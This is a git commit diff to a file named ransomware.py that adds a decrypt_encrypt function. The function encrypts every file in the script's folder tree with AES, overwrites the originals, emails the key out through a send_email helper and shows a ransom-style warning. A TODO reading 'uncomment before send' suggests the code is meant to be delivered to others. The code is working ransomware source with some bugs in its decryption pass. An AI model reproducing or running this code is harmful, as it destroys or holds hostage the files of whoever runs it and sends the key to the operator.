23c08f0b4dbb1d081020da954e9aac67ef5f30ec
Yaryna Horodetska <yaryna.gorodietska@gmail.com>
2022-06-17 18:42:29 +0300

    Add new function decrypt_encrypt

--- ransomware.py
+++ ransomware.py
@@ -1,6 +1,5 @@
 import base64
 import os
-import json
 from base64 import b64encode
 from Crypto.Cipher import AES
 from base64 import b64decode
@@ -48,7 +47,7 @@ def decrypt():
 def encrypt():
     # ui_key = input("Enter a key to decrypt all of the files:")
     # TODO: uncomment before send
-    dkey=base64.b64decode(key)
+    dkey=base64.b64decode(ui_key)
     #TODO: change key by ui_key after uncomment
     ransomware_path = os.path.realpath(__file__)
     folder_path = os.path.dirname(os.path.abspath(__file__))
@@ -91,6 +90,49 @@ def test_encryption_on_one_word():
         print("The message was: ", pt)
     except (ValueError, KeyError):
         print("Incorrect decryption")
-
-
 test_encryption_on_one_word()
+
+
+
+def decrypt_encrypt():
+    key=get_random_bytes(16)
+    b64_key=base64.b64encode(key).decode()
+    ransomware_path=os.path.realpath(__file__)
+    folder_path=os.path.dirname(os.path.abspath(__file__))
+    for root,dirs,files in os.walk(folder_path):
+        for a_file in files:
+            full_file_path=f"{root}\\{a_file}"
+            if full_file_path != ransomware_path:
+                file=open(full_file_path,"rb")
+                data=file.read()
+                file.close()
+                file=open(full_file_path,"wb")
+                cipher = AES.new(key, AES.MODE_OFB)
+                encr= cipher.encrypt(data)
+                iv = b64encode(cipher.iv).decode('utf-8')
+                e_data=cipher.iv
+                e_data+=encr
+                file.write(e_data)
+                file.close()
+    send_email(b64_key)
+    print("Warning!")
+    print(f"Your files in {folder_path} and it's subfolders have been encrypted!")
+    ui_key = input("Enter a key to decrypt all of the files:")
+    dkey=base64.b64decode(ui_key)
+    ransomware_path = os.path.realpath(__file__)
+    folder_path = os.path.dirname(os.path.abspath(__file__))
+    for root,dirs,files in os.walk(folder_path):
+        for a_file in files:
+            full_file_path=f"{root}\\{a_file}"
+            if full_file_path != ransomware_path:
+                file=open(full_file_path,"rb")
+                e_data=file.read()
+                file.close()
+                file=open(full_file_path,"wb")
+                iv = b64decode(iv)
+                d_cipher = AES.new(key, AES.MODE_OFB, iv=iv)
+                decr = d_cipher.decrypt(e_data)
+                file.write(decr)
+                file.close()
+    print(f"Your files in {folder_path} and it's subfolders have been decrypted!")
+decrypt_encrypt()
